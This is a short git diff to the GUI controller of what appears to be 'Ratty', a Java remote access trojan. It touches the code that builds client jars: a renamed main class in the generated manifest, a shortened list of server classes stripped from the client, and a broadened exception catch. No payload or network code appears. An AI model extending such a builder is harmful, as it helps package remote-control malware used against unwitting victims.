@@ -4,7 +4,6 @@ import static de.sogomn.rat.util.Constants.LANGUAGE;
 
 import java.awt.image.BufferedImage;
 import java.io.File;
-import java.io.IOException;
 import java.net.URL;
 import java.text.SimpleDateFormat;
 import java.util.Collection;
@@ -81,7 +80,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 	private static final String BUILDER_DATA_REPLACEMENT = "data";
 	private static final String BUILDER_DATA_REPLACEMENT_FORMAT = "%s:%s";
 	private static final String BUILDER_MANIFEST_REPLACEMENT = "META-INF/MANIFEST.MF";
-	private static final byte[] BUILDER_MANIFEST_REPLACEMENT_DATA = ("Manifest-Version: 1.0" + System.lineSeparator() + "Class-Path: ." + System.lineSeparator() + "Main-Class: de.sogomn.rat.Client" + System.lineSeparator() + System.lineSeparator()).getBytes();
+	private static final byte[] BUILDER_MANIFEST_REPLACEMENT_DATA = ("Manifest-Version: 1.0" + System.lineSeparator() + "Class-Path: ." + System.lineSeparator() + "Main-Class: de.sogomn.rat.RattyClient" + System.lineSeparator() + System.lineSeparator()).getBytes();
 	private static final String[] BUILDER_REMOVALS = {
 		"ping.wav",
 		"lato.ttf",
@@ -107,13 +106,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 		"language/lang_fr.properties",
 		"language/lang_ro.properties",
 		"language/lang_sr.properties",
-		"language/lang_sr_Latn.properties",
-		"de/sogomn/rat/RattyServer.class",
-		"de/sogomn/rat/util/Resources.class",
-		"de/sogomn/rat/util/JarBuilder.class",
-		"de/sogomn/rat/server/ActiveServer.class",
-		"de/sogomn/rat/server/AbstractRattyController.class",
-		"de/sogomn/rat/server/IServerObserver.class"
+		"language/lang_sr_Latn.properties"
 	};
 	
 	private static final String FREE_WARNING = LANGUAGE.getString("server.free_warning");
@@ -520,7 +513,7 @@ public final class RattyGuiController extends AbstractRattyController implements
 			for (final String removal : BUILDER_REMOVALS) {
 				JarBuilder.removeFile(selectedBuilderFile, removal);
 			}
-		} catch (final IOException ex) {
+		} catch (final Exception ex) {
 			gui.showError(BUILDER_ERROR_MESSAGE + System.lineSeparator() + ex);
 		}
 		
